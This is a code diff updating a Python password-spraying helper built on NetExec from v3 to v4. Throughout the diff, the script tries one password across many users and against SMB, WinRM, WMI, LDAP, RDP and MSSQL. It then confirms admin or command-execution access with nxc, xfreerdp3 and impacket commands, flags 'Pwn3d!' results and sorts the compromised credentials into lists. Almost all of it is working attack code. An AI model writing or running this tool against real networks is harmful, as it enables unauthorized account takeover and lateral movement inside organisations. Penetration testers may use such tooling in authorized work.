@@ -44,8 +44,14 @@ def run_nxc(proto, target, user, password, local_auth):
         text=True
     )
 
+# smarter success detection
 def extract_success(output):
-    return "[+]" in output and "[-]" not in output
+    if "[+]" in output:
+        return True
+    return False
+
+def is_pwned(output):
+    return "Pwn3d!" in output
 
 # =====================
 # VALIDATION LOGIC
@@ -53,31 +59,16 @@ def extract_success(output):
 def validate_access(proto, target, user, password):
     try:
         # -----------------
-        # RDP
-        # -----------------
-        if proto == "rdp":
-            cmd = [
-                "xfreerdp3",
-                f"/u:{user}",
-                f"/p:{password}",
-                f"/v:{target}",
-                "/cert:ignore",
-                "+auth-only"
-            ]
-            result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-
-            if result.returncode == 0:
-                return True, "RDP login confirmed"
-
-        # -----------------
         # SMB
         # -----------------
-        elif proto == "smb":
+        if proto == "smb":
             cmd = ["nxc", "smb", target, "-u", user, "-p", password, "--shares"]
             result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
 
             if "ADMIN$" in result.stdout:
                 return True, "ADMIN$ access confirmed"
+
+            return False, "SMB auth valid but no admin access"
 
         # -----------------
         # WINRM
@@ -89,48 +80,67 @@ def validate_access(proto, target, user, password):
             if user.lower() in result.stdout.lower():
                 return True, "Command execution confirmed"
 
+            return False, "WinRM auth valid but no execution"
+
         # -----------------
-        # MSSQL (NEW)
+        # WMI
+        # -----------------
+        elif proto == "wmi":
+            cmd = ["nxc", "wmi", target, "-u", user, "-p", password, "-x", "whoami"]
+            result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+
+            if user.lower() in result.stdout.lower():
+                return True, "WMI execution confirmed"
+
+            return False, "WMI auth valid but no execution"
+
+        # -----------------
+        # LDAP
+        # -----------------
+        elif proto == "ldap":
+            cmd = ["nxc", "ldap", target, "-u", user, "-p", password, "--users"]
+            result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+
+            if "CN=" in result.stdout or "userPrincipalName" in result.stdout:
+                return True, "LDAP bind + enumeration confirmed"
+
+            return False, "LDAP bind valid (use for BloodHound)"
+
+        # -----------------
+        # RDP
+        # -----------------
+        elif proto == "rdp":
+            cmd = [
+                "xfreerdp3",
+                f"/u:{user}",
+                f"/p:{password}",
+                f"/v:{target}",
+                "/cert:ignore",
+                "+auth-only"
+            ]
+
+            result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+
+            if result.returncode == 0:
+                return True, "RDP login confirmed"
+
+            return False, "RDP auth valid but interactive login blocked (likely NLA/policy)"
+
+        # -----------------
+        # MSSQL
         # -----------------
         elif proto == "mssql":
-            # Try Windows Authentication first
             cmd = [
                 "impacket-mssqlclient",
                 f"{user}:{password}@{target}",
                 "-windows-auth"
             ]
 
-            result = subprocess.run(
-                cmd,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                text=True,
-                timeout=10
-            )
-
+            result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=10)
             output = result.stdout + result.stderr
 
-            if "Login failed" not in output and "authentication failed" not in output.lower():
+            if "Login failed" not in output:
                 return True, "MSSQL login confirmed (Windows auth)"
-
-            # Fallback to SQL Authentication
-            cmd = [
-                "impacket-mssqlclient",
-                f"{user}:{password}@{target}"
-            ]
-
-            result = subprocess.run(
-                cmd,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                text=True,
-                timeout=10
-            )
-
-            output = result.stdout + result.stderr
-
-            if "Login failed" not in output and "authentication failed" not in output.lower():
-                return True, "MSSQL login confirmed (SQL auth)"
 
             return False, "MSSQL auth failed"
 
@@ -154,9 +164,6 @@ def explain_failure(output):
     if "Connection refused" in output:
         explanations.append("Service not reachable")
 
-    if "ADMIN$" in output:
-        explanations.append("SMB auth succeeded but admin blocked (UAC filtering)")
-
     return explanations
 
 # =====================
@@ -164,7 +171,7 @@ def explain_failure(output):
 # =====================
 def main():
     parser = argparse.ArgumentParser(
-        description="NetExec multi-protocol password spraying helper (v3)"
+        description="NetExec multi-protocol password spraying helper (v4)"
     )
 
     parser.add_argument("protocols", help="Comma-separated protocols or 'all'")
@@ -178,9 +185,8 @@ def main():
     parser.add_argument("--explain", action="store_true")
     parser.add_argument("--no-color", action="store_true")
 
-    # NEW FLAGS
     parser.add_argument("--validate", action="store_true",
-                        help="Validate real access (RDP/SMB/WinRM/MSSQL)")
+                        help="Validate real access")
     parser.add_argument("--only-access", action="store_true",
                         help="Only show confirmed access")
 
@@ -204,8 +210,8 @@ def main():
 
     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
     logfile = f"spray_{timestamp}.log"
-    credsfile = f"valid_creds_{timestamp}.txt"
 
+    access_creds = []
     valid_creds = []
 
     print(f"[+] Users     : {len(users)}")
@@ -228,24 +234,32 @@ def main():
                 if extract_success(output):
                     entry = f"{proto} {target} {user}:{args.password}"
 
+                    # auto-detect pwned
+                    if is_pwned(output):
+                        tag = "[ACCESS]"
+                        msg = "NetExec Pwn3d! (execution confirmed)"
+                        access_creds.append(entry)
+                        print(f"{GREEN}{BOLD}{tag} → {entry} ({msg}){RESET}")
+                        continue
+
                     tag = "[VALID]"
-                    validation_msg = ""
+                    msg = ""
 
                     if args.validate:
                         success, msg = validate_access(proto, target, user, args.password)
 
                         if success:
                             tag = "[ACCESS]"
-                            validation_msg = f" ({msg})"
+                            access_creds.append(entry)
                         else:
-                            validation_msg = f" ({msg})"
+                            valid_creds.append(entry)
+                    else:
+                        valid_creds.append(entry)
 
                     if args.only_access and tag != "[ACCESS]":
                         continue
 
-                    valid_creds.append(entry)
-
-                    print(f"{GREEN}{BOLD}{tag} → {entry}{validation_msg}{RESET}")
+                    print(f"{GREEN}{BOLD}{tag} → {entry} ({msg}){RESET}")
 
                 elif args.explain:
                     reasons = explain_failure(output)
@@ -257,16 +271,17 @@ def main():
 
     print("\n" + "=" * 60)
 
-    if valid_creds:
-        with open(credsfile, "w") as f:
-            f.write("\n".join(valid_creds))
-
-        print(f"{GREEN}{BOLD}[+] RESULTS ({len(valid_creds)}){RESET}")
-        for cred in valid_creds:
+    if access_creds:
+        print(f"{GREEN}{BOLD}[+] ACCESS ({len(access_creds)}){RESET}")
+        for cred in access_creds:
             print(f"{GREEN}  → {cred}{RESET}")
 
-        print(f"\n[+] Saved to: {credsfile}")
-    else:
+    if valid_creds:
+        print(f"{YELLOW}{BOLD}[+] VALID ONLY ({len(valid_creds)}){RESET}")
+        for cred in valid_creds:
+            print(f"{YELLOW}  → {cred}{RESET}")
+
+    if not access_creds and not valid_creds:
         print(f"{RED}{BOLD}[-] No valid credentials found{RESET}")
 
     print("=" * 60)
